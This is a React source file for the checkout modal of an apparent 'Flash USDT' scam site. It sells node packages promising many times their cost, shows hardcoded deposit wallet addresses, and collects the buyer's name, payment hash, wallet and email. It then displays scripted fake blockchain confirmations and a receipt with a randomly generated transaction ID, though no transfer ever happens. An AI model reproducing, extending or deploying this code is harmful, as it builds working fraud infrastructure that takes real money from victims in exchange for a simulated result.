import React, { useState, useEffect } from 'react';
import { X, Copy, Check, Shield, ArrowRight, Smartphone, Mail, Globe, Database, Terminal, RefreshCw } from 'lucide-react';

export default function PurchaseModal({ isOpen, onClose, selectedPackage, setSelectedPackage }) {
  const [step, setStep] = useState(1);
  const [network, setNetwork] = useState('TRC20');
  const [copied, setCopied] = useState(false);
  const [agreed, setAgreed] = useState(false);
  const [signature, setSignature] = useState('');
  const [isQrExpanded, setIsQrExpanded] = useState(false);
  
  // Form fields
  const [recipientWallet, setRecipientWallet] = useState('');
  const [txHash, setTxHash] = useState('');
  const [email, setEmail] = useState('');
  
  // Simulated loading steps for receipt confirmation
  const [loadStep, setLoadStep] = useState(0);
  const [loadMessages, setLoadMessages] = useState([
    { text: 'Broadcasting deposit hash to validator nodes...', done: false },
    { text: 'Waiting for network confirmations (TRON blockchain)...', done: false },
    { text: 'Verifying liquidity allocation & double-spend reserves...', done: false },
    { text: 'Compiling flash metadata payloads...', done: false },
    { text: 'Broadcasting flash USDT contract transfers...', done: false },
  ]);

  const [receiptTxId, setReceiptTxId] = useState('');

  const walletAddresses = {
    TRC20: 'TP69XuAYC6Ux6sg4KcQqYU3oPmgLkCaMTS',
    ERC20: '0xcaf5888Ee1039f5Bc1F850141fA3248F739dAd6E',
    BEP20: '0xcaf5888Ee1039f5Bc1F850141fA3248F739dAd6E'
  };

  useEffect(() => {
    if (!isOpen) {
      // Reset state on close
      setStep(1);
      setAgreed(false);
      setSignature('');
      setRecipientWallet('');
      setTxHash('');
      setEmail('');
      setIsQrExpanded(false);
      setLoadStep(0);
      setLoadMessages([
        { text: 'Broadcasting deposit hash to validator nodes...', done: false },
        { text: 'Waiting for network confirmations (TRON blockchain)...', done: false },
        { text: 'Verifying liquidity allocation & double-spend reserves...', done: false },
        { text: 'Compiling flash metadata payloads...', done: false },
        { text: 'Broadcasting flash USDT contract transfers...', done: false },
      ]);
    }
  }, [isOpen]);

  // Handle live loading steps in Step 5
  useEffect(() => {
    if (step === 5 && loadStep < loadMessages.length) {
      const timer = setTimeout(() => {
        setLoadMessages(prev => prev.map((msg, idx) => {
          if (idx === loadStep) return { ...msg, done: true };
          return msg;
        }));
        setLoadStep(prev => prev + 1);
      }, 2000);
      return () => clearTimeout(timer);
    } else if (step === 5 && loadStep === loadMessages.length) {
      // Generate simulated receipt TxID
      const randomHex = Array.from({length: 40}, () => Math.floor(Math.random()*16).toString(16)).join('');
      setReceiptTxId(randomHex);
    }
  }, [step, loadStep]);

  if (!isOpen) return null;

  const handleCopy = () => {
    navigator.clipboard.writeText(walletAddresses[network]);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleNextStep = () => {
    if (step === 1 && !selectedPackage) return;
    if (step === 2 && (!agreed || !signature.trim())) return;
    if (step === 4 && (!recipientWallet.trim() || !txHash.trim() || !email.trim())) return;
    setStep(prev => prev + 1);
  };

  const handlePrevStep = () => {
    setStep(prev => Math.max(prev - 1, 1));
  };

  const packageList = [
    { id: 'starter', name: 'Starter Node', cost: 100, yieldVal: '4,000' },
    { id: 'premium', name: 'Premium Node', cost: 150, yieldVal: '7,000' },
    { id: 'enterprise', name: 'Enterprise Node', cost: 300, yieldVal: '18,000' }
  ];

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm scanline select-none">
      
      {/* Glow Backdrops */}
      <div className="absolute w-[400px] h-[400px] bg-green-500/10 rounded-full blur-[100px] pointer-events-none" />

      {/* Main Modal Container */}
      <div className="max-w-2xl w-full rounded-3xl glass-panel-neon relative overflow-hidden border border-green-500/20 shadow-[0_0_55px_rgba(34,197,94,0.2)]">
        
        {/* Close Button */}
        <button
          onClick={onClose}
          className="absolute top-5 right-5 p-2 rounded-lg bg-zinc-950/60 border border-zinc-800 text-zinc-400 hover:text-white transition-colors cursor-pointer"
        >
          <X size={16} />
        </button>

        {/* Modal Header */}
        <div className="p-6 border-b border-zinc-800 bg-zinc-950/40">
          <h2 className="text-md font-black uppercase font-mono tracking-wider text-white flex items-center gap-2">
            <Shield size={16} className="text-green-500" />
            NODE DEPLOYMENT WIZARD
          </h2>
          {/* Stepper Steps UI */}
          <div className="flex items-center gap-2 mt-4 font-mono text-[9px] text-zinc-500">
            {[1, 2, 3, 4, 5].map((i) => (
              <React.Fragment key={i}>
                <span className={`px-2 py-0.5 rounded border ${
                  step === i 
                    ? 'bg-green-500/10 border-green-500/30 text-green-400 font-bold' 
                    : step > i 
                      ? 'border-green-500/10 text-green-600'
                      : 'border-zinc-850 text-zinc-600'
                }`}>
                  0{i}
                </span>
                {i < 5 && <span className="text-zinc-700">&gt;</span>}
              </React.Fragment>
            ))}
          </div>
        </div>

        {/* Modal Content Scrollable Area */}
        <div className="p-6 max-h-[70svh] overflow-y-auto scrollbar-thin">
          
          {/* STEP 1: Select Package */}
          {step === 1 && (
            <div className="space-y-6">
              <div className="text-left">
                <h3 className="text-sm font-bold uppercase font-mono text-green-400 mb-1">Step 1: Choose Flash Node Package</h3>
                <p className="text-xs text-zinc-400">Select which active deployment level you want loaded onto our transaction validator bridge.</p>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                {packageList.map((pkg) => {
                  const isSelected = selectedPackage?.id === pkg.id;
                  return (
                    <div
                      key={pkg.id}
                      onClick={() => setSelectedPackage(pkg)}
                      className={`p-5 rounded-2xl border text-left cursor-pointer transition-all duration-300 relative overflow-hidden
                        ${isSelected 
                          ? 'bg-green-500/5 border-green-500/40 shadow-[0_0_20px_rgba(34,197,94,0.15)]' 
                          : 'bg-zinc-950 border-zinc-850 hover:border-zinc-800'}`}
                    >
                      <h4 className="text-xs font-bold font-mono uppercase text-white mb-2">{pkg.name}</h4>
                      <div className="text-lg font-bold font-mono text-white mb-4">${pkg.cost} USDT</div>
                      <div className="text-[10px] font-mono text-zinc-400 bg-zinc-900 px-2 py-1.5 rounded-lg border border-zinc-850 flex justify-between">
                        <span>YIELD:</span>
                        <span className="text-green-400 font-bold">{pkg.yieldVal} USDT</span>
                      </div>
                    </div>
                  );
                })}
              </div>
            </div>
          )}

          {/* STEP 2: Accept Terms */}
          {step === 2 && (
            <div className="space-y-6 text-left">
              <div>
                <h3 className="text-sm font-bold uppercase font-mono text-green-400 mb-1">Step 2: Software License Agreement</h3>
                <p className="text-xs text-zinc-400">Review and approve transaction network rules prior to wallet binding.</p>
              </div>

              <div className="bg-black/50 border border-zinc-850 rounded-2xl p-4 h-44 overflow-y-auto text-[10px] font-mono text-zinc-500 leading-relaxed scrollbar-thin">
                <p className="font-bold text-zinc-300 uppercase mb-2">FLASHER NODE SOFTWARE TERMS OF USE v4.3</p>
                <p className="mb-2">1. SCOPE OF SIMULATION: The user acknowledges that Flash USDT supplied via this platform constitutes simulation assets designed for system validation, load testing, and multi-signature bridge verification. The utility matches the exact standard TRC20 signature representation but expires after the stated threshold (140-160 days).</p>
                <p className="mb-2">2. RE-SALE RIGHTS: Flash nodes support a built-in resale module, letting users liquidate simulated token assets back to the platform router at up to 85% rebate before contract expiration.</p>
                <p className="mb-2">3. RISK DISCLOSURE: All network operations are permanent. Validators broadcast transactions directly to peer networks. Ensure your wallet destination is compatible.</p>
              </div>

              <div className="space-y-4">
                <label className="flex items-start gap-3 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={agreed}
                    onChange={(e) => setAgreed(e.target.checked)}
                    className="mt-0.5 accent-green-500 w-4 h-4 rounded cursor-pointer"
                  />
                  <span className="text-xs text-zinc-400 leading-normal select-none">
                    I have read and unconditionally accept the software license and node routing rules.
                  </span>
                </label>

                <div className="space-y-2">
                  <span className="block text-[10px] font-mono text-zinc-500 uppercase">DIGITAL CONTRACT SIGNATURE:</span>
                  <input
                    type="text"
                    value={signature}
                    onChange={(e) => setSignature(e.target.value)}
                    placeholder="Type your full name to digitally sign"
                    className="w-full bg-zinc-950 border border-zinc-800 rounded-xl px-4 py-3 text-xs text-white focus:outline-none focus:border-green-500 transition-colors placeholder:text-zinc-600 font-mono"
                  />
                </div>
              </div>
            </div>
          )}

          {/* STEP 3: Complete Payment */}
          {step === 3 && (
            <div className="space-y-6">
              <div className="text-left">
                <h3 className="text-sm font-bold uppercase font-mono text-green-400 mb-1">Step 3: Transfer USDT Node Fee</h3>
                <p className="text-xs text-zinc-400">Send the package cost to our automated verification smart address.</p>
              </div>

              {/* Multi-Network Toggles */}
              <div className="flex gap-1.5 p-1 rounded-xl bg-zinc-950 border border-zinc-850 w-fit mx-auto">
                {['TRC20', 'BEP20', 'ERC20'].map((net) => (
                  <button
                    key={net}
                    onClick={() => setNetwork(net)}
                    className={`px-4 py-1.5 rounded-lg text-[10px] font-bold font-mono tracking-wider uppercase transition-colors cursor-pointer
                      ${network === net ? 'bg-green-500/10 text-green-400 border border-green-500/20' : 'text-zinc-500'}`}
                  >
                    {net}
                  </button>
                ))}
              </div>

              {/* Payment Details Container */}
              <div className="p-6 bg-black/40 rounded-3xl border border-zinc-850 flex flex-col md:flex-row items-center gap-6">
                
                {/* QR Code Graphic Mockup Column */}
                <div className="flex flex-col items-center gap-1.5 shrink-0">
                  <div 
                    onClick={() => setIsQrExpanded(true)}
                    className="w-32 h-32 p-0.5 bg-white rounded-2xl flex items-center justify-center relative shadow-[0_0_20px_rgba(255,255,255,0.05)] overflow-hidden cursor-pointer hover:scale-105 active:scale-95 transition-all duration-300 group"
                  >
                    {/* Outer glowing frame */}
                    <div className="absolute inset-0 border border-zinc-800 rounded-2xl" />
                    
                    {network === 'ERC20' || network === 'BEP20' ? (
                      <img
                        src="/erc20_qr.jpg"
                        alt="USDT Address QR Code"
                        className="w-full h-full object-contain"
                      />
                    ) : (
                      /* Decorative QR Lines SVG Mock */
                      <svg className="w-full h-full text-black" viewBox="0 0 100 100">
                        <rect x="5" y="5" width="25" height="25" fill="currentColor" />
                        <rect x="10" y="10" width="15" height="15" fill="white" />
                        <rect x="70" y="5" width="25" height="25" fill="currentColor" />
                        <rect x="75" y="10" width="15" height="15" fill="white" />
                        <rect x="5" y="70" width="25" height="25" fill="currentColor" />
                        <rect x="10" y="75" width="15" height="15" fill="white" />
                        {/* Random code dots */}
                        <rect x="40" y="10" width="10" height="20" fill="currentColor" />
                        <rect x="15" y="45" width="15" height="10" fill="currentColor" />
                        <rect x="45" y="45" width="15" height="15" fill="currentColor" />
                        <rect x="70" y="40" width="20" height="10" fill="currentColor" />
                        <rect x="40" y="75" width="20" height="20" fill="currentColor" />
                        <rect x="75" y="75" width="10" height="15" fill="currentColor" />
                      </svg>
                    )}
                  </div>
                  {(network === 'ERC20' || network === 'BEP20') && (
                    <span className="text-[7px] text-cyan-400 font-mono tracking-wider animate-pulse select-none cursor-pointer">
                      🔍 CLICK TO EXPAND QR
                    </span>
                  )}
                </div>

                {/* Info & Copy address */}
                <div className="flex-1 space-y-4 text-left w-full">
                  <div className="space-y-1">
                    <span className="block text-[8px] font-mono text-zinc-500 uppercase">DEPOSIT COST REQUIRED:</span>
                    <span className="text-xl font-black font-mono text-white">${selectedPackage?.cost || selectedPackage?.payAmount} USDT</span>
                    <span className="text-[10px] text-zinc-500 uppercase font-mono ml-2">({network} NETWORK)</span>
                  </div>

                  <div className="space-y-1.5">
                    <span className="block text-[8px] font-mono text-zinc-500 uppercase">USDT DESTINATION WALLET:</span>
                    <div className="flex items-center gap-2 p-3 bg-zinc-950 border border-zinc-800 rounded-xl">
                      <span className="text-[10px] font-mono text-zinc-300 break-all select-all">{walletAddresses[network]}</span>
                      <button
                        onClick={handleCopy}
                        className="p-1.5 rounded hover:bg-zinc-900 text-zinc-400 hover:text-white transition-colors shrink-0 cursor-pointer"
                      >
                        {copied ? <Check size={14} className="text-green-500" /> : <Copy size={14} />}
                      </button>
                    </div>
                  </div>
                </div>
              </div>

              <div className="flex gap-2 items-center text-[10px] text-zinc-500 max-w-md mx-auto leading-relaxed text-left bg-zinc-950/40 p-3 rounded-xl border border-zinc-850">
                <Smartphone size={16} className="text-green-500 shrink-0" />
                <span>Scan the QR code or copy address to complete deposit using TrustWallet, Binance, or TronLink. Verify network type matches selection.</span>
              </div>
            </div>
          )}

          {/* STEP 4: Submit Details */}
          {step === 4 && (
            <div className="space-y-6 text-left">
              <div>
                <h3 className="text-sm font-bold uppercase font-mono text-green-400 mb-1">Step 4: Wallet Binding & Transaction Hash</h3>
                <p className="text-xs text-zinc-400">Provide the transaction TXID hash and the recipient wallet for delivery verification.</p>
              </div>

              <div className="space-y-4">
                {/* Recipient Wallet */}
                <div className="space-y-1.5">
                  <label className="block text-[9px] font-mono text-zinc-500 uppercase">RECIPIENT DESTINATION WALLET:</label>
                  <div className="relative">
                    <input
                      type="text"
                      value={recipientWallet}
                      onChange={(e) => setRecipientWallet(e.target.value)}
                      placeholder="Enter target TRC20/ERC20 address to receive Flash USDT"
                      className="w-full bg-zinc-950 border border-zinc-800 rounded-xl px-4 py-3 text-xs text-white focus:outline-none focus:border-green-500 transition-colors font-mono"
                    />
                    <span className="absolute right-3.5 top-3.5 text-[8px] font-bold font-mono text-zinc-600 uppercase">TARGET</span>
                  </div>
                </div>

                {/* TxID Hash */}
                <div className="space-y-1.5">
                  <label className="block text-[9px] font-mono text-zinc-500 uppercase">DEPOSIT DEPOSIT TXID HASH:</label>
                  <div className="relative">
                    <input
                      type="text"
                      value={txHash}
                      onChange={(e) => setTxHash(e.target.value)}
                      placeholder="Paste the TxID / Transaction ID of your package payment"
                      className="w-full bg-zinc-950 border border-zinc-800 rounded-xl px-4 py-3 text-xs text-white focus:outline-none focus:border-green-500 transition-colors font-mono"
                    />
                    <span className="absolute right-3.5 top-3.5 text-[8px] font-bold font-mono text-zinc-600 uppercase">TXID_HASH</span>
                  </div>
                </div>

                {/* Email Address */}
                <div className="space-y-1.5">
                  <label className="block text-[9px] font-mono text-zinc-500 uppercase">ALERT EMAIL ADDRESS:</label>
                  <div className="relative">
                    <input
                      type="email"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      placeholder="For transfer logs and system updates"
                      className="w-full bg-zinc-950 border border-zinc-800 rounded-xl px-4 py-3 text-xs text-white focus:outline-none focus:border-green-500 transition-colors font-mono"
                    />
                    <span className="absolute right-3.5 top-3.5 text-[8px] font-bold font-mono text-zinc-600 uppercase">METADATA</span>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* STEP 5: Receive Transfer */}
          {step === 5 && (
            <div className="space-y-6">
              {loadStep < loadMessages.length ? (
                /* Stepper Loading screen */
                <div className="space-y-8 py-4">
                  <div className="flex flex-col items-center justify-center space-y-4">
                    <div className="p-4 bg-green-500/10 border border-green-500/30 text-green-400 rounded-2xl animate-spin">
                      <RefreshCw size={24} />
                    </div>
                    <div>
                      <h4 className="text-sm font-bold uppercase font-mono text-white">COMMITTING NETWORK BROADCAST</h4>
                      <p className="text-[10px] font-mono text-zinc-500 mt-1">BLOCKS REMAINING: {loadMessages.length - loadStep}</p>
                    </div>
                  </div>

                  {/* Terminal processing items */}
                  <div className="bg-black/60 border border-zinc-850 rounded-2xl p-5 text-left font-mono text-[10px] text-zinc-400 space-y-2 max-w-md mx-auto shadow-[inset_0_0_10px_rgba(0,0,0,0.8)]">
                    <div className="flex items-center gap-1.5 text-green-500/70 border-b border-zinc-850 pb-2 mb-2">
                      <Terminal size={10} />
                      <span>VALIDATOR_BRIDGE_DAEMON</span>
                    </div>

                    {loadMessages.map((msg, i) => (
                      <div key={i} className="flex items-start gap-2">
                        {msg.done ? (
                          <span className="text-green-500 font-bold select-none">[OK]</span>
                        ) : i === loadStep ? (
                          <span className="text-cyan-400 font-bold select-none animate-pulse">&gt;&gt;</span>
                        ) : (
                          <span className="text-zinc-700 select-none">[..]</span>
                        )}
                        <span className={i === loadStep ? 'text-white font-bold' : msg.done ? 'text-zinc-500' : 'text-zinc-650'}>
                          {msg.text}
                        </span>
                      </div>
                    ))}
                  </div>
                </div>
              ) : (
                /* Interactive Blockchain Receipt Screen */
                <div className="space-y-6 text-left">
                  <div className="text-center space-y-2">
                    <div className="w-12 h-12 rounded-full bg-green-500/10 border border-green-500/40 text-green-400 flex items-center justify-center mx-auto shadow-[0_0_15px_rgba(34,197,94,0.3)]">
                      <Check size={24} className="stroke-[2.5]" />
                    </div>
                    <h4 className="text-sm font-bold uppercase font-mono text-green-400">Node Transfer Dispatched Successfully</h4>
                    <p className="text-xs text-zinc-400 max-w-sm mx-auto">Your simulated Flash USDT has been successfully minted and transferred to the bound recipient wallet address.</p>
                  </div>

                  {/* Cryptographic Receipt Panel */}
                  <div className="bg-black/60 border border-zinc-800/80 rounded-2xl p-6 font-mono text-[10px] space-y-3 relative overflow-hidden">
                    {/* Decorative cyber seal */}
                    <div className="absolute -right-8 -bottom-8 w-24 h-24 bg-green-500/5 rounded-full border border-dashed border-green-500/20 flex items-center justify-center font-bold text-[8px] text-green-500/30 tracking-widest select-none rotate-45">
                      VERIFIED
                    </div>

                    <div className="flex justify-between items-center border-b border-zinc-850 pb-2.5">
                      <span className="text-zinc-500 uppercase tracking-widest font-bold">TRANSACTION RECEIPT</span>
                      <span className="text-green-500 font-bold">SUCCESSFUL</span>
                    </div>

                    <div className="grid grid-cols-3 gap-2">
                      <span className="text-zinc-500">PACKAGE DEPLOYED:</span>
                      <span className="col-span-2 text-white font-bold">{selectedPackage?.name}</span>
                    </div>

                    <div className="grid grid-cols-3 gap-2">
                      <span className="text-zinc-500">FLASH USDT YIELD:</span>
                      <span className="col-span-2 text-green-400 font-extrabold">{selectedPackage?.yieldVal || selectedPackage?.yieldAmount} USDT</span>
                    </div>

                    <div className="grid grid-cols-3 gap-2">
                      <span className="text-zinc-500">MAPPED NETWORK:</span>
                      <span className="col-span-2 text-white font-bold">{network} NETWORK</span>
                    </div>

                    <div className="grid grid-cols-3 gap-2">
                      <span className="text-zinc-500">RECIPIENT TARGET:</span>
                      <span className="col-span-2 text-zinc-300 break-all select-all font-bold">{recipientWallet}</span>
                    </div>

                    <div className="grid grid-cols-3 gap-2">
                      <span className="text-zinc-500">ALERT METADATA:</span>
                      <span className="col-span-2 text-zinc-300 break-all font-bold">{email}</span>
                    </div>

                    <div className="grid grid-cols-3 gap-2 border-t border-zinc-850 pt-2.5 mt-2">
                      <span className="text-zinc-500">RECEIPT TXID:</span>
                      <span className="col-span-2 text-cyan-400 break-all select-all font-bold">f_{receiptTxId}</span>
                    </div>
                  </div>

                  <div className="text-center font-mono text-[9px] text-zinc-500">
                    A confirmation report was dispatched to {email}. You can check your wallet after 10-15 minutes.
                  </div>
                </div>
              )}
            </div>
          )}

        </div>

        {/* Modal Actions Footer */}
        <div className="p-6 border-t border-zinc-800 bg-zinc-950/40 flex justify-between gap-4">
          {step > 1 && step < 5 && (
            <button
              onClick={handlePrevStep}
              className="px-6 py-3.5 rounded-xl text-xs font-bold uppercase tracking-wider bg-zinc-900 border border-zinc-800 text-white hover:bg-zinc-850 transition-colors cursor-pointer"
            >
              Back
            </button>
          )}

          {step < 5 ? (
            <button
              onClick={handleNextStep}
              disabled={
                (step === 1 && !selectedPackage) ||
                (step === 2 && (!agreed || !signature.trim())) ||
                (step === 4 && (!recipientWallet.trim() || !txHash.trim() || !email.trim()))
              }
              className={`py-3.5 px-6 rounded-xl text-xs font-bold uppercase tracking-wider text-black flex items-center gap-1.5 ml-auto transition-all duration-300 cursor-pointer
                ${((step === 1 && !selectedPackage) || (step === 2 && (!agreed || !signature.trim())) || (step === 4 && (!recipientWallet.trim() || !txHash.trim() || !email.trim())))
                  ? 'bg-zinc-900 border border-zinc-850 text-zinc-600 cursor-not-allowed'
                  : 'bg-green-500 hover:bg-green-400 shadow-[0_0_15px_rgba(34,197,94,0.35)]'}`}
            >
              <span>Continue</span>
              <ArrowRight size={12} />
            </button>
          ) : (
            /* Close Button after successful loading */
            loadStep === loadMessages.length && (
              <button
                onClick={onClose}
                className="w-full py-4 rounded-xl text-xs font-bold uppercase tracking-wider text-black bg-gradient-to-r from-green-500 to-emerald-500 shadow-[0_0_20px_rgba(34,197,94,0.35)] hover:shadow-[0_0_30px_rgba(34,197,94,0.5)] transition-all cursor-pointer text-center"
              >
                Close Deployment
              </button>
            )
          )}
        </div>

        {/* High-Resolution QR Card Zoom Overlay */}
        {isQrExpanded && (
          <div 
            className="fixed inset-0 z-[999] bg-black/95 backdrop-blur-md flex items-center justify-center p-6 cursor-zoom-out select-none"
            onClick={() => setIsQrExpanded(false)}
          >
            <div className="absolute top-6 right-6 text-zinc-400 hover:text-white cursor-pointer transition-colors p-2.5 bg-zinc-900/50 rounded-full border border-zinc-800">
              <X size={20} />
            </div>
            
            <div 
              className="max-w-md w-full max-h-[85vh] rounded-3xl bg-zinc-950 border border-zinc-850 p-6 flex flex-col items-center gap-4 relative shadow-[0_20px_50px_rgba(6,182,212,0.15)] transition-all duration-300"
              onClick={(e) => e.stopPropagation()}
            >
              <div className="flex justify-between items-center w-full border-b border-zinc-850 pb-3 mb-2 font-mono">
                <span className="text-[10px] font-black text-cyan-400 tracking-wider">USDT {network} DUAL-VERIFIED CARD</span>
                <span className="text-[8px] text-zinc-500 uppercase">HIGH RESOLUTION</span>
              </div>
              
              {/* The actual full quality image */}
              <div className="w-full aspect-[3/4] bg-white rounded-2xl overflow-hidden p-1 border border-zinc-800 flex items-center justify-center shadow-[0_0_15px_rgba(0,0,0,0.1)]">
                <img 
                  src="/erc20_qr.jpg" 
                  alt={`USDT ${network} Address Card`} 
                  className="w-full h-full object-contain"
                />
              </div>
              
              <div className="text-center font-mono space-y-1.5 w-full mt-2">
                <span className="block text-[8px] text-zinc-500 uppercase">VERIFIED LEDGER INJECTION TARGET:</span>
                <div className="p-3 bg-zinc-900 border border-zinc-850 rounded-xl select-all font-mono text-[9px] text-zinc-300 break-all text-center">
                  0xcaf5888Ee1039f5Bc1F850141fA3248F739dAd6E
                </div>
              </div>
            </div>
          </div>
        )}

      </div>
    </div>
  );
}
